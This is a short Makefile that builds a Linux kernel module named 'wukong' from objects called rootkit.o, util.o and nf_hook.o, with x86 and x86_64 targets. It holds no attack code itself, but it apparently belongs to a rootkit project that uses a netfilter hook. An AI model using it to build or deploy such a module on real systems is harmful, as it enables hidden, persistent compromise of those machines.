obj-m += wukong.o
wukong-objs := rootkit.o util.o nf_hook.o

default:
	@echo "To build wukong:"
	@echo "  make TARGET"
	@echo
	@echo "Supported targets:"
	@echo "linux-x86    	Linux, x86"
	@echo "linux-x86_64 	Linux, x86_64"

linux-x86:
	make EXTRA_CFLAGS="-D_CONFIG_X86_" -b -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

linux-x86_64:
	make EXTRA_CFLAGS="-D_CONFIG_X86_64_" -b -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
 
clean:
	make -b -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
